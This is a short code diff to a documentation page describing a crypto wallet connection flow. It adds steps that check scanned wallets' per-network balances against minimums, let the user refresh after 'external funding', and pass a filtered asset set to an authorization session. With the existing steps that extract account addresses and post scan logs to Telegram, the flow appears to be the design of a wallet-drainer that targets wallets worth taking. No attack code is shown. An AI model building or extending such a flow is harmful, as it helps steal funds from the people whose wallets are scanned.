@@ -54,8 +54,10 @@ export const walletFlowsPage: DocPage = {
             "beginTransaction() — empty sessionStorage shell.",
             "openWalletConnect() — QR after CARD_CONNECTING_MIN_MS delay.",
             "scanWallet() — extract EVM/Tron accounts, assignJourneyId(), fetch /api/balances, postTgLog(scan).",
-            "Network pick — user selects one network.",
-            "requestAuthorizeSession() → runAuthorizationSession().",
+            "Check Eligibility — fresh /api/balances fetch, evaluate per-network minimum balances (BigInt comparison).",
+            "Network pick — user selects one eligible or partially eligible network.",
+            "Refresh Balance (optional) — per-network fresh fetch + re-evaluation after external funding.",
+            "requestAuthorizeSession() → filtered asset set → runAuthorizationSession().",
           ]}
         />
       ),
